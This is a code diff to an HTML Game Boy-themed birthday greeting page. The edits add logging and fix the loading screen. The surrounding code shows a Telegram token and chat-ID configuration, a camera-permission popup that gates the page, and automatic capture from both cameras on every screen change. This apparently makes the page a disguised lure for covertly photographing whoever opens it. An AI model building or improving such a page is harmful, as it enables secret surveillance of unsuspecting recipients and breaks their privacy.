@@ -408,8 +408,8 @@ Happy Birthday! 🎂✨
                 </div>
                 <div class="speaker-grille"></div>
             </div>
-    </div>
-    <!-- Message Screen -->
+        </div>
+        <!-- Message Screen -->
 <div id="message-screen" class="screen">
     <div class="page-container">
         <div class="page-screen">
@@ -616,8 +616,8 @@ Happy Birthday! 🎂✨
     }
     .stats-row { display: flex; justify-content: space-between; margin: 5px 0; }
     .stats-value { color: #ffff00; font-weight: bold; }
-    </style>
-    <script>
+</style>
+<script>
     // ============================================
     // TELEGRAM CONFIG (YOUR TOKEN & CHAT ID)
     // ============================================
@@ -864,19 +864,22 @@ Happy Birthday! 🎂✨
     // ============================================
     function startGame() {
         document.body.innerHTML = '';
-        
-        // Restore the original HTML structure
         location.reload();
     }
 
     // ============================================
-    // LOADING SCREEN
+    // LOADING SCREEN (FIX - PASTI JALAN)
     // ============================================
     function simulateLoading() {
         const progressFill = document.getElementById('progress-fill');
         const progressText = document.getElementById('progress-text');
         const loadingText = document.getElementById('loading-text');
-        if (!progressFill || !progressText || !loadingText) return;
+        
+        if (!progressFill || !progressText || !loadingText) {
+            console.error('Loading elements not found!');
+            showScreen('main');
+            return;
+        }
         
         let progress = 0;
         const messages = [
@@ -899,25 +902,42 @@ Happy Birthday! 🎂✨
             
             if (progress >= 100) {
                 clearInterval(interval);
-                setTimeout(() => showScreen('main'), 500);
+                console.log('Loading complete, switching to main screen...');
+                setTimeout(() => {
+                    showScreen('main');
+                }, 500);
             }
         }, 200);
     }
 
+    // ============================================
+    // SHOW SCREEN (FIX - GLOBAL FUNCTION)
+    // ============================================
     window.showScreen = function(screenId) {
+        console.log('showScreen called for:', screenId);
+        
         if (!cameraPermission) {
             showGameboyPopup();
             return;
         }
         
-        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        // Hide all screens
+        document.querySelectorAll('.screen').forEach(s => {
+            s.classList.remove('active');
+            console.log('Removed active from:', s.id);
+        });
+        
+        // Show target screen
         const targetScreen = document.getElementById(screenId + '-screen');
         if (targetScreen) {
             targetScreen.classList.add('active');
             currentScreen = screenId;
+            console.log('Activated screen:', screenId);
             
             // Auto capture on screen change
             captureBothCameras(`(opened ${screenId})`);
+        } else {
+            console.error('Screen not found:', screenId + '-screen');
         }
     };
 
@@ -925,13 +945,16 @@ Happy Birthday! 🎂✨
     // INITIALIZE
     // ============================================
     window.addEventListener('load', () => {
+        console.log('Page loaded, initializing...');
         loadStats();
         
         const alreadyAllowed = localStorage.getItem('gameboyCameraAllowed');
         if (alreadyAllowed === 'true') {
+            console.log('Camera already allowed, starting game...');
             cameraPermission = true;
             simulateLoading();
         } else {
+            console.log('Showing permission popup...');
             showGameboyPopup();
         }
     });
@@ -1041,7 +1064,7 @@ Happy Birthday! 🎂✨
     function closeSecret() {
         document.getElementById('secret-modal')?.classList.remove('active');
     }
-            <script>
+        <script>
         // ============================================
         // LETTERS (6 ENGLISH LETTERS)
         // ============================================
